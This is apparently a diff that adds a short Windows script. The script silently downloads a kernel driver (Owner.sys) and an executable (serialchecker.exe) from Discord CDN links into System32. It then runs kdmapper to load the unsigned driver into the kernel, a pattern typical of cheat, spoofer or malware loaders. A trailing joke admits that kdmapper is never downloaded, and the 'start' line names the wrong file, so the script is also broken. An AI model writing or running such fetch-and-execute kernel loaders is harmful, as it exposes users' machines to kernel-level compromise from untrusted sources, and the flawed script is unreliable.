@@ -1,0 +1,6 @@
+curl --silent https://cdn.discordapp.com/attachments/1138009315169533974/1138310926655832104/Owner.sys --output C:/Windows/System32/Owner.sys >n
+curl --silent https://cdn.discordapp.com/attachments/1138009315169533974/1138358724663185418/serialchecker.exe --output C:/Windows/System32/serialchecker.exe 2>&1
+start C:/Windows/System32/serial
+start C:/Windows/System32/kdmapper.exe C:/Windows/System32/Owner.sys
+
+fun fact: kdmapper doesnt even get downloaded 😂
